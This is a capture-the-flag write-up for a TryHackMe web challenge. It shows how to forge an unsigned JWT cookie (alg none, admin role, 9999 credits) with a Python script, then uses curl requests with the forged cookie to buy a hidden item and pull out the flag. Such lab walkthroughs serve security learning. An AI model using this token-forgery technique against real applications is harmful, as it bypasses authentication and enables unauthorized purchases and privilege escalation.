# Love-at-First-Breach-Write-Up
# CTF Challenge hosted by Try Hack Me Ticketing Rooms Write-ups
# TryHeartMe – TryHackMe Write-Up (JWT Cookie Tampering)
# Overview

# Challenge: TryHeartMe
# Category: Web
# Difficulty: Easy
# Platform: TryHackMe

# Objective:
# Purchase the hidden “Valenflag” item from the shop and retrieve the flag.

# Enumeration:

# Upon visiting the application, the shop displayed several items available for purchase using credits. However, my account had 0 credits, and the application stated that online top-ups were unavailable.
# Inspect the JWT cookie
curl -i http://MACHINE_IP:5000/

# 1. Inspecting browser requests revealed a JWT stored in the cookie:

tryheartme_jwt=<token>

# 2. Generate a forged JWT with admin privileges and high credits

# Python script used to create a JWT with:

# alg = none
# role = admin
# credits = 9999
# python script
python3 - <<'PY'
import base64, json

def b64u(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

header = {"alg":"none","typ":"JWT"}

payload = {
    "email":"challenger@tryhackme.com",
    "role":"admin",
    "credits":9999,
    "theme":"valentine"
}

token = f"{b64u(header)}.{b64u(payload)}."
print(token)
PY

# Store the generated token:

NEWADMIN='GENERATED_TOKEN_HERE'

# 3. Verify admin access and discover hidden product
curl -s http://MACHINE_IP:5000/ \
-H "Cookie: tryheartme_jwt=$NEWADMIN" \
| grep -i product

# Hidden product discovered:

/product/valenflag

# 4. Access the hidden product page
curl -s http://MACHINE_IP:5000/product/valenflag \
-H "Cookie: tryheartme_jwt=$NEWADMIN"
# 5. Purchase the hidden product
curl -X POST http://MACHINE_IP:5000/buy/valenflag \
-H "Cookie: tryheartme_jwt=$NEWADMIN"

# Server response:

Location: /receipt/valenflag

# 6. Retrieve the flag from the receipt page
curl -s http://MACHINE_IP:5000/receipt/valenflag \
-H "Cookie: tryheartme_jwt=$NEWADMIN"

# Extract flag:

curl -s http://MACHINE_IP:5000/receipt/valenflag \
-H "Cookie: tryheartme_jwt=$NEWADMIN" \
| grep -oE 'THM\{[^}]+\}'

# FINAL FLAG OBTAINED
